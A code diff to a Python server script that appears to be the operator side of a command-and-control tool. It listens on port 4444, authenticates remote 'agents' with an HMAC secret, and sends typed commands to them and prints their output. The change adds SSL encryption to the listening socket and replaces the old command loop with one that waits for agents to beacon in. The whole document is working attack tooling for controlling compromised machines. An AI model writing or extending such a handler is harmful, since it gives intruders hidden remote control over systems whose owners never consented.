@@ -3,6 +3,7 @@ import hmac
 import hashlib
 import os
 import sys
+import ssl
 
 HOST = "0.0.0.0"
 PORT = 4444
@@ -51,39 +52,14 @@ def main():
     server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     server.bind((HOST, PORT))
     server.listen(5)
+    
+    # Wrap the socket with SSL
+    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
+    context.load_cert_chain(certfile="server.crt", keyfile="server.key")
+    secure_server = context.wrap_socket(server, server_side=True)
 
     print(f"[+] Listening on port {PORT}...")
 
-    # while True:
-    #     conn, addr = server.accept()
-    #     # print(f"[+] Connection from {addr}")
-
-    #     if not authenticate(conn, SECRET):
-    #         print("[-] Authentication failed")
-    #         conn.close()
-    #         continue
-
-    #     command = input("> ").strip()
-
-    #     if not command:
-    #         # print("[!] Empty command, try again")
-    #         conn.close()
-    #         continue
-        
-    #     if command.lower() == "exit":
-    #         print("[*] Closing connection")
-    #         sys.exit(0)
-
-    #     conn.sendall(command.encode())
-
-    #     output = conn.recv(8192)
-
-    #     if not output:
-    #         print("[-] No response")
-    #     else:
-    #         print(output.decode())
-
-    #     conn.close()
     while True:
         # Get a non-empty command BEFORE waiting for the agent to beacon in
         while True:
